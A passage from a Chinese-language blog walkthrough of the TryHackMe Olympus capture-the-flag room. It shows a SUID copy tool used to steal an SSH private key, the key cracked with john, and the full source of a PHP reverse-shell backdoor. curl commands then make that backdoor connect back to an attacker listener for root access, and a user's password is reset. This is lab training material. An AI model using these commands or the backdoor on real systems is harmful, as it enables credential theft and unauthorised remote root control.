class="line">File copied successfully.</span><br><span class="line">www-data@ip-10-48-159-106:/home/zeus$ ls -al</span><br><span class="line">ls -al</span><br><span class="line"></span><br><span class="line">-rw-r--r-- 1 zeus www-data   34 Jun 18 05:41 1.txt</span><br><span class="line">-rw-rw-r-- 1 zeus zeus       34 Mar 23  2022 user.flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>也就是说可以用来复制 ssh 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-48-159-106:/home/zeus$ /usr/bin/cputils</span><br><span class="line">/usr/bin/cputils</span><br><span class="line">  ____ ____        _   _ _     </span><br><span class="line"> / ___|  _ \ _   _| |_(_) |___ </span><br><span class="line">| |   | |_) | | | | __| | / __|</span><br><span class="line">| |___|  __/| |_| | |_| | \__ \</span><br><span class="line"> \____|_|    \__,_|\__|_|_|___/</span><br><span class="line">                               </span><br><span class="line">Enter the Name of Source File: /home/zeus/.ssh/id_rsa </span><br><span class="line">/home/zeus/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">Enter the Name of Target File: 1.rsa</span><br><span class="line">1.rsa</span><br><span class="line"></span><br><span class="line">File copied successfully.</span><br><span class="line"></span><br><span class="line">www-data@ip-10-48-159-106:/home/zeus$ cat 1.rsa</span><br><span class="line">cat 1.rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2</span><br><span class="line">...</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p>破解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# chmod 600 zeus_rsa   </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# ssh2john zeus_rsa &gt; zeus        </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# john --wordlist=/usr/share/wordlists/rockyou.txt zeus        </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 16 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">snowflake        (zeus_rsa)     </span><br><span class="line">1g 0:00:01:11 DONE (2026-06-18 13:48) 0.01399g/s 21.04p/s 21.04c/s 21.04C/s maurice..bunny</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
+<p>登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# ssh -i zeus_rsa zeus@10.48.159.106 </span><br><span class="line">Enter passphrase for key &#x27;zeus_rsa&#x27;: </span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Sat Jul 16 07:52:39 2022</span><br><span class="line"></span><br><span class="line">zeus@ip-10-48-159-106:~$ id</span><br><span class="line">uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)</span><br></pre></td></tr></table></figure>
+<p>查看属于 zeus 组的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zeus@ip-10-48-159-106:~$ find / -group zeus 2&gt;/dev/null</span><br><span class="line">...</span><br><span class="line">/var/www/olympus.thm/public_html/~webmaster/search.php</span><br><span class="line">/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc</span><br><span class="line">/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html</span><br><span class="line">/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看 php 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass = &quot;a7c5ffcf139742f52a5267c4a0674129&quot;;</span><br><span class="line">if(!isset($_POST[&quot;password&quot;]) || $_POST[&quot;password&quot;] != $pass) die(&#x27;&lt;form name=&quot;auth&quot; method=&quot;POST&quot;&gt;Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;/form&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">set_time_limit(0);</span><br><span class="line"></span><br><span class="line">$host = htmlspecialchars(&quot;$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]&quot;, ENT_QUOTES, &quot;UTF-8&quot;);</span><br><span class="line">if(!isset($_GET[&quot;ip&quot;]) || !isset($_GET[&quot;port&quot;])) die(&quot;&lt;h2&gt;&lt;i&gt;snodew reverse root shell backdoor&lt;/i&gt;&lt;/h2&gt;&lt;h3&gt;Usage:&lt;/h3&gt;Locally: nc -vlp [port]&lt;/br&gt;Remote: $host?ip=[destination of listener]&amp;port=[listening port]&quot;);</span><br><span class="line">$ip = $_GET[&quot;ip&quot;]; $port = $_GET[&quot;port&quot;];</span><br><span class="line"></span><br><span class="line">$write_a = null;</span><br><span class="line">$error_a = null;</span><br><span class="line"></span><br><span class="line">$suid_bd = &quot;/lib/defended/libc.so.99&quot;;</span><br><span class="line">$shell = &quot;uname -a; w; $suid_bd&quot;;</span><br><span class="line"></span><br><span class="line">chdir(&quot;/&quot;); umask(0);</span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if(!$sock) die(&quot;couldn&#x27;t open socket&quot;);</span><br><span class="line"></span><br><span class="line">$fdspec = array(0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;));</span><br><span class="line">$proc = proc_open($shell, $fdspec, $pipes);</span><br><span class="line"></span><br><span class="line">if(!is_resource($proc)) die();</span><br><span class="line"></span><br><span class="line">for($x=0;$x&lt;=2;$x++) stream_set_blocking($pipes[x], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line"></span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">    if(feof($sock) || feof($pipes[1])) break;</span><br><span class="line">    $read_a = array($sock, $pipes[1], $pipes[2]);</span><br><span class="line">    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span><br><span class="line">    if(in_array($sock, $read_a)) &#123; $i = fread($sock, 1400); fwrite($pipes[0], $i); &#125;</span><br><span class="line">    if(in_array($pipes[1], $read_a)) &#123; $i = fread($pipes[1], 1400); fwrite($sock, $i); &#125;</span><br><span class="line">    if(in_array($pipes[2], $read_a)) &#123; $i = fread($pipes[2], 1400); fwrite($sock, $i); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">for($x=0;$x&lt;=2;$x++) fclose($pipes[x]);</span><br><span class="line">proc_close($proc);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是一个 PHP 反弹 Shell 后门，它尝试执行 <code>/lib/defended/libc.so.99</code> 这个 SUID 文件来获取 root 权限。</p>
+<table>
+<thead>
+<tr>
+<th>关键部分</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>密码保护</strong></td>
+<td><code>$pass = &quot;a7c5ffcf139742f52a5267c4a0674129&quot;</code>（MD5 哈希）</td>
+</tr>
+<tr>
+<td><strong>SUID 文件</strong></td>
+<td><code>/lib/defended/libc.so.99</code>（应该是提权用的二进制文件）</td>
+</tr>
+<tr>
+<td><strong>Shell 命令</strong></td>
+<td><code>$shell = &quot;uname -a; w; $suid_bd&quot;;</code>（执行系统信息 + SUID 文件）</td>
+</tr>
+<tr>
+<td><strong>反弹连接</strong></td>
+<td>通过 GET 参数 <code>ip</code> 和 <code>port</code> 指定反弹目标</td>
+</tr>
+<tr>
+<td>密码是 md5 解密得到 secured</td>
+<td></td>
+</tr>
+<tr>
+<td>curl 访问</td>
+<td></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# curl -X POST &quot;http://10.48.159.106/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php&quot; -d &quot;password=a7c5ffcf139742f52a5267c4a0674129&quot;   </span><br><span class="line">&lt;h2&gt;&lt;i&gt;snodew reverse root shell backdoor&lt;/i&gt;&lt;/h2&gt;&lt;h3&gt;Usage:&lt;/h3&gt;Locally: nc -vlp [port]&lt;/br&gt;Remote: 10.48.159.106/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=[destination of listener]&amp;port=[listening port]  </span><br></pre></td></tr></table></figure>
+
+<p>反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# curl -X POST &quot;http://10.48.159.106/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=192.168.152.140&amp;port=4444&quot; -d &quot;password=a7c5ffcf139742f52a5267c4a0674129&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 24720</span><br><span class="line">Linux ip-10-48-159-106 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 06:14:21 up  1:43,  1 user,  load average: 0.00, 0.01, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">zeus     pts/1    192.168.152.140  05:58   11:40   0.05s  0.05s -bash</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data),7777(web)</span><br></pre></td></tr></table></figure>
+
+<p>cat 查看 flag 显示不全，用 less 就显示全了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">You did it, you defeated the gods.</span><br><span class="line">                        Hope you had fun !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                   flag&#123;D4mN!_Y0u_G0T_m3_:)_&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)</span><br><span class="line"></span><br><span class="line">                  (Hint : regex can be usefull)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提示有一个隐藏的 flag，并且建议以 root 身份通过ssh登录以查找，可是root没有ssh登录凭据，可以使用正则来搜索flag<br>但是呢，zeus 是使用 ssh 登录的，可以在这个反弹 shell 里面通过 root 权限修改zeus密码，并添加进sudo权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">passwd zeus</span><br><span class="line">New password: zeus  </span><br><span class="line">Retype new password: zeus</span><br><span class="line">passwd: password updated successfully</span><br><span class="line">usermod -a -G sudo zeus</span><br></pre></td></tr></table></figure>
+<p>然后到之前使用 ssh登录zeus的终端来提权到root<br>使用正则表达式来搜索 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">zeus@ip-10-48-159-106:/var/www/html$ sudo su</span><br><span class="line">root@ip-10-48-159-106:/var/www/html# find / -type f -exec fgrep -l &#x27;flag&#123;&#x27; &#123;&#125; \;</span><br><span class="line">/root/root.flag</span><br><span class="line">/boot/initrd.img-5.15.0-138-generic</span><br><span class="line">/home/zeus/user.flag</span><br><span class="line">/home/zeus/1.txt</span><br><span class="line">/etc/ssl/private/.b0nus.fl4g</span><br><span class="line"></span><br><span class="line">root@ip-10-48-159-106:/var/www/html# cat /etc/ssl/private/.b0nus.fl4g</span><br><span class="line">Here is the final flag ! Congrats !</span><br><span class="line"></span><br><span class="line">flag&#123;Y0u_G0t_m3_g00d!&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">As a reminder, here is a usefull regex :</span><br><span class="line"></span><br><span class="line">grep -irl flag&#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_olympusroom.html">https://x9wd09ncc.github.io/post/TryHackMe_olympusroom.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/medium/">medium</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Prioritise.html" title="TryHackMe_Prioritise"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Prioritise</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Dig_Bug.html" title="TryHackMe_Dig_Bug"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Dig_Bug</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Mr%20Robot%20CTF.html" title="TryHackMe_Mr Robot CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-18</div><div class="title">TryHackMe_Mr Robot CTF</div></div></a></div><div><a href="/post/TryHackMe_Prioritise.html" title="TryHackMe_Prioritise"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-18</div><div class="title">TryHackMe_Prioritise</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Blueprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Blueprint</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">X9wd09ncc</div><div class="author-info__description">.....</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">100</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/TryHackMe_Mr%20Robot%20CTF.html" title="TryHackMe_Mr Robot CTF">TryHackMe_Mr Robot CTF</a><time datetime="2026-06-18T13:03:21.109Z" title="发表于 2026-06-18 21:03:21">2026-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/TryHackMe_Prioritise.html" title="TryHackMe_Prioritise">TryHackMe_Prioritise</a><time datetime="2026-06-18T13:03:21.094Z" title="发表于 2026-06-18 21:03:21">2026-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/TryHackMe_olympusroom.html" title="TryHackMe_olympusroom">TryHackMe_olympusroom</a><time datetime="2026-06-18T06:36:20.000Z" title="发表于 2026-06-18 14:36:20">2026-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/TryHackMe_Dig_Bug.html" title="TryHackMe_Dig_Bug">TryHackMe_Dig_Bug</a><time datetime="2026-06-17T06:13:55.000Z" title="发表于 2026-06-17 14:13:55">2026-06-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/TryHackMe_Dev_Diaries.html" title="TryHackMe_Dev_Diaries">TryHackMe_Dev_Diaries</a><time datetime="2026-06-17T04:04:12.000Z" title="发表于 2026-06-17 12:04:12">2026-06-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.bootcdn.net/ajax/libs/click-heart/1.0.0/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
